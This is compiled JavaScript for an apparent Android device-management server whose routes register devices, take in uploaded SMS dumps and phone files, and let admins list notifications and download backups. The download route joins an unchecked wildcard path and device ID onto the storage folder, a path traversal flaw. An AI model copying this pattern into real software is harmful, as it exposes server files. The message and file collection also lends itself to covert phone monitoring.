"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.devicesRoutes = devicesRoutes;
const zod_1 = require("zod");
const DeviceService_1 = require("../services/DeviceService");
const auth_middleware_1 = require("../middleware/auth.middleware");
const deviceAuth_middleware_1 = require("../middleware/deviceAuth.middleware");
const ConnectionRegistry_1 = require("../websocket/ConnectionRegistry");
const config_1 = require("../config");
const prisma_1 = __importDefault(require("../db/prisma"));
const fs_1 = __importDefault(require("fs"));
const path_1 = __importDefault(require("path"));
const RegisterSchema = zod_1.z.object({
    androidId: zod_1.z.string().min(1),
    serialNumber: zod_1.z.string().optional(),
    model: zod_1.z.string().min(1),
    manufacturer: zod_1.z.string().min(1),
    androidVersion: zod_1.z.string().min(1),
    sdkVersion: zod_1.z.number().int(),
    agentVersion: zod_1.z.string().min(1),
    enrollmentToken: zod_1.z.string().min(1),
});
async function devicesRoutes(app) {
    // -----------------------------------------------------------
    // POST /api/v1/devices/register  (لا تحتاج admin auth)
    // -----------------------------------------------------------
    app.post('/register', async (request, reply) => {
        const parseResult = RegisterSchema.safeParse(request.body);
        if (!parseResult.success) {
            return reply.status(400).send({ error: 'VALIDATION_ERROR', details: parseResult.error.errors });
        }
        try {
            const result = await DeviceService_1.DeviceService.registerDevice(parseResult.data);
            return reply.status(201).send(result);
        }
        catch (err) {
            const error = err;
            if (error.message === 'INVALID_ENROLLMENT_TOKEN') {
                return reply.status(403).send({ error: 'INVALID_ENROLLMENT_TOKEN', message: 'Enrollment token is invalid' });
            }
            throw err;
        }
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices  (admin required)
    // -----------------------------------------------------------
    app.get('/', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const devices = await DeviceService_1.DeviceService.getAllDevices();
        return reply.send({ devices, total: devices.length });
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/:deviceUid  (admin required)
    // -----------------------------------------------------------
    app.get('/:deviceUid', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const { deviceUid } = request.params;
        const device = await DeviceService_1.DeviceService.getDeviceByUid(deviceUid);
        if (!device) {
            return reply.status(404).send({ error: 'DEVICE_NOT_FOUND', message: `Device ${deviceUid} not found` });
        }
        return reply.send({ device });
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/stats  (admin required)
    // -----------------------------------------------------------
    app.get('/stats', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const allDevices = await DeviceService_1.DeviceService.getAllDevices();
        const onlineCount = allDevices.filter((d) => d.isOnline).length;
        return reply.send({
            total: allDevices.length,
            online: onlineCount,
            offline: allDevices.length - onlineCount,
            wsStats: ConnectionRegistry_1.ConnectionRegistry.getStats(),
        });
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/:deviceUid/notifications  (admin required)
    // -----------------------------------------------------------
    app.get('/:deviceUid/notifications', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const { deviceUid } = request.params;
        const limit = parseInt(request.query.limit || '50', 10);
        const device = await DeviceService_1.DeviceService.getDeviceByUid(deviceUid);
        if (!device) {
            return reply.status(404).send({ error: 'DEVICE_NOT_FOUND' });
        }
        const notifications = await prisma_1.default.notificationLog.findMany({
            where: { deviceId: device.id },
            orderBy: { postedAt: 'desc' },
            take: limit,
        });
        return reply.send({ notifications, total: notifications.length });
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/:deviceUid/files  (admin required)
    // -----------------------------------------------------------
    app.get('/:deviceUid/files', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const { deviceUid } = request.params;
        const limit = parseInt(request.query.limit || '20', 10);
        const fileType = request.query.fileType;
        const device = await DeviceService_1.DeviceService.getDeviceByUid(deviceUid);
        if (!device) {
            return reply.status(404).send({ error: 'DEVICE_NOT_FOUND' });
        }
        const files = await prisma_1.default.backupFile.findMany({
            where: {
                deviceId: device.id,
                ...(fileType ? { fileType } : {}),
            },
            orderBy: { createdAt: 'desc' },
            take: limit,
        });
        return reply.send({ files, total: files.length });
    });
    // -----------------------------------------------------------
    // POST /api/v1/devices/:deviceUid/files/upload-sms
    // يُستدعى من الـ Agent مباشرة (device auth)
    // -----------------------------------------------------------
    app.post('/:deviceUid/files/upload-sms', { preHandler: deviceAuth_middleware_1.requireDevice }, async (request, reply) => {
        const { deviceUid } = request.params;
        const body = request.body;
        if (!body || !Array.isArray(body.messages)) {
            return reply.status(400).send({ error: 'INVALID_BODY', message: 'messages array is required' });
        }
        // جلب الجهاز
        const device = await prisma_1.default.device.findUnique({ where: { deviceUid } });
        if (!device) {
            return reply.status(404).send({ error: 'DEVICE_NOT_FOUND' });
        }
        // إنشاء مجلد الحفظ
        const timestamp = new Date().toISOString().replace(/[:.]/g, '').slice(0, 15);
        const fileName = `sms_${timestamp}.json`;
        const dirPath = path_1.default.resolve(config_1.config.fileStoragePath, 'backups', deviceUid);
        const filePath = path_1.default.join(dirPath, fileName);
        const fileKey = `backups/${deviceUid}/${fileName}`;
        fs_1.default.mkdirSync(dirPath, { recursive: true });
        fs_1.default.writeFileSync(filePath, JSON.stringify({
            exportedAt: new Date().toISOString(),
            deviceUid,
            commandId: body.commandId,
            totalCount: body.messages.length,
            messages: body.messages,
        }, null, 2), 'utf8');
        const fileSizeBytes = BigInt(fs_1.default.statSync(filePath).size);
        // حفظ السجل في DB
        await prisma_1.default.backupFile.create({
            data: {
                deviceId: device.id,
                commandId: body.commandId,
                fileType: 'sms',
                fileKey,
                fileName,
                fileSizeBytes,
                recordCount: body.messages.length,
                storageProvider: 'local',
                mimeType: 'application/json',
            },
        });
        console.log(`[FilesRoute] SMS backup saved: ${fileKey} (${body.messages.length} messages)`);
        return reply.status(201).send({ fileKey, recordCount: body.messages.length });
    });
    // -----------------------------------------------------------
    // POST /api/v1/devices/:deviceUid/files/upload
    // يستقبل ملفات عامة عبر Multipart (بواسطة PullFileCommand)
    // -----------------------------------------------------------
    app.post('/:deviceUid/files/upload', { preHandler: deviceAuth_middleware_1.requireDevice }, async (request, reply) => {
        const { deviceUid } = request.params;
        const data = await request.file();
        if (!data) {
            return reply.status(400).send({ error: 'MISSING_FILE', message: 'No file uploaded' });
        }
        const device = await prisma_1.default.device.findUnique({ where: { deviceUid } });
        if (!device) {
            return reply.status(404).send({ error: 'DEVICE_NOT_FOUND' });
        }
        // قراءة الـ fields الأخرى مثل commandId (إن وُجد)
        const commandId = data.fields.commandId ? data.fields.commandId.value : undefined;
        // إنشاء مجلد الحفظ
        const timestamp = new Date().toISOString().replace(/[:.]/g, '').slice(0, 15);
        const originalName = data.filename.replace(/[^a-zA-Z0-9.-]/g, '_');
        const fileName = `file_${timestamp}_${originalName}`;
        const dirPath = path_1.default.resolve(config_1.config.fileStoragePath, 'backups', deviceUid);
        const filePath = path_1.default.join(dirPath, fileName);
        const fileKey = `backups/${deviceUid}/${fileName}`;
        fs_1.default.mkdirSync(dirPath, { recursive: true });
        // حفظ الملف على الـ Disk
        const writeStream = fs_1.default.createWriteStream(filePath);
        await new Promise((resolve, reject) => {
            data.file.pipe(writeStream)
                .on('finish', resolve)
                .on('error', reject);
        });
        const fileSizeBytes = BigInt(fs_1.default.statSync(filePath).size);
        // حفظ السجل في قاعدة البيانات
        await prisma_1.default.backupFile.create({
            data: {
                deviceId: device.id,
                commandId: commandId,
                fileType: 'generic',
                fileKey,
                fileName,
                fileSizeBytes,
                storageProvider: 'local',
                mimeType: data.mimetype || 'application/octet-stream',
            },
        });
        console.log(`[FilesRoute] File saved: ${fileKey} (${fileSizeBytes} bytes)`);
        return reply.status(201).send({ fileKey, fileName, size: Number(fileSizeBytes) });
    });
    // -----------------------------------------------------------
    // GET /api/v1/devices/:deviceUid/files/:fileKey/download
    // تحميل ملف backup (admin only)
    // -----------------------------------------------------------
    app.get('/:deviceUid/files/download/*', { preHandler: auth_middleware_1.requireAdmin }, async (request, reply) => {
        const { deviceUid } = request.params;
        const subPath = request.params['*'];
        const filePath = path_1.default.resolve(config_1.config.fileStoragePath, 'backups', deviceUid, subPath);
        if (!fs_1.default.existsSync(filePath)) {
            return reply.status(404).send({ error: 'FILE_NOT_FOUND' });
        }
        const stream = fs_1.default.createReadStream(filePath);
        reply.header('Content-Type', 'application/json');
        reply.header('Content-Disposition', `attachment; filename="${path_1.default.basename(filePath)}"`);
        return reply.send(stream);
    });
}
//# sourceMappingURL=devices.routes.js.map